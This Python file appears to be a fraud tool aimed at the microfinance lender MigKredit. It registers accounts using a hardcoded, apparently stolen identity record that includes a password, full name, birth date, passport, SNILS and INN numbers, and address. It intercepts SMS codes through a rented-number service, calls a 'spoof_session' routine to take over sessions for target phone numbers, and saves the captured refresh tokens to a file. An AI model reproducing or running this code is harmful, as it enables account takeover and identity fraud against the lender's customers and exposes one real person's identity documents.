import asyncio
import logging
import re

from data_class import DataQueue
from mig_service import MigService
from mig_service_register import from_line_to_gos_user, MigServiceRegister
from sms_hub_service import SmsHubService

line = '79092492667:DaM8l08x! | Пол: M | ФИО: Мех Дмитрий  Витальевич | Дата рождения: 02-04-1990 | Место рождения: Комсомольск-на-Амуре | Телефон: +7(909)2492667 | Почта: None | СНИЛС: 197-965-911 62 | ИНН: 370309267147 | Постоянный адрес: край. Краснодарский, г. Сочи, р-н. Центральный, ул. Пластунская, д. 155 | Фактический адрес: None | Серия и номер паспорта: 2415 796575 | Дата выдачи: 17.11.2015 | Выдано: Отделом УФМС России по Ивановской области в Кинешемском муниципальном районе | Код подразделения: 370023 | Сканы: нет |  Кредитный рейтинг: Низкий рейтинг |  Rate: 167'


class Checker:
    def __init__(self,
                 data_queue: DataQueue):
        self.number = None
        self.number_id = None
        self.sms_hub_client = SmsHubService()
        self.data_queue = data_queue

    async def get_number(self) -> (int, int):
        number_id, number = await self.sms_hub_client.get_new_number()
        self.number_id = number_id
        self.number = number
        return number_id, number

    async def register_on_mig(self) -> (int, int):
        number_id, number = self.number_id, self.number
        user = from_line_to_gos_user(line=line)
        mig_service = MigServiceRegister(user=user)
        await mig_service.request_token()
        await mig_service.request_reg_1(number=number[1:])

        await mig_service.get_init()
        await mig_service.get_ucdb_id()
        await mig_service.get_couca_100()
        await mig_service.get_client_loyality()

        await mig_service.request_reg_2()
        await mig_service.get_couca_3_4_1()
        await mig_service.request_send_code()
        code = await self.sms_hub_client.get_status_number(id=number_id)
        if code is False:
            await self.sms_hub_client.close_number(id=number_id)
            await self.get_number()
            return await self.register_on_mig()

        pattern = re.compile(r"Конфиденциально. Ваш код подтверждения: (?P<code>\d+) ООО МФК МигКредит")
        match = pattern.match(code)
        if match is not None:
            code_otp = match.group('code')
            await mig_service.request_send_otp(code=code_otp)
            await mig_service.get_couca_3_5()
            await mig_service.request_send_work()
            await mig_service.get_couca_3_7()
            await mig_service.wait_for_final_status()

            await self.sms_hub_client.resend_number(id=number_id)
        else:
            return None, None

        return number_id, number

    async def checker_worker(self):
        await self.get_number()
        await self.register_on_mig()
        while True:
            number = await self.data_queue.get_data()
            if number is None:
                continue
            print(number)
            try:
                await self.check_number(number=number)
            except:
                await self.check_number(number=number)

    async def check_number(self,
                           number: str):
        mig_service = MigService(number=self.number,
                                 number_id=self.number_id)
        await mig_service.request_token()
        call_id = await mig_service.send_code()
        if call_id == 0:
            await self.register_on_mig()
            await self.check_number(number=number)
        if call_id is False:
            await self.sms_hub_client.close_number(id=self.number_id)
            await self.get_number()
            await self.register_on_mig()
            await self.check_number(number=number)
            return False
        code = await self.sms_hub_client.get_status_number(id=self.number_id)
        if code is False:
            await self.sms_hub_client.close_number(id=self.number_id)
            await self.get_number()
            await self.register_on_mig()
            await self.check_number(number=number)
            return False

        pattern = re.compile(r"Kod podtvershdeniya: (?P<code>\d+)")
        match = pattern.match(code)
        if match is not None:
            code_otp = match.group('code')
            print(code_otp)
            correct = await mig_service.spoof_session(number=number,
                                                      code=code_otp,
                                                      call_id=call_id)
            await self.sms_hub_client.resend_number(id=self.number_id)
            if correct is False:
                return await self.check_number(number=number)
        await asyncio.sleep(5)
        try:
            if await mig_service.check_loyalty_flag():
                logging.info(f'Good loyalty session: {number} - token: {mig_service.refresh_token}')
                with open('final.txt', 'a') as file:
                    file.write(f'{number}:{mig_service.refresh_token}\n')
            else:
                logging.info(f'Bad loyalty session: {number} - token: {mig_service.refresh_token}')
                with open('bad_final.txt', 'a') as file:
                    file.write(f'{number}:{mig_service.refresh_token}\n')
        except:
            logging.info(f'Error loyalty session: {number} - token: {mig_service.refresh_token}')
            with open('bad_final.txt', 'a') as file:
                file.write(f'{number}:{mig_service.refresh_token}\n')
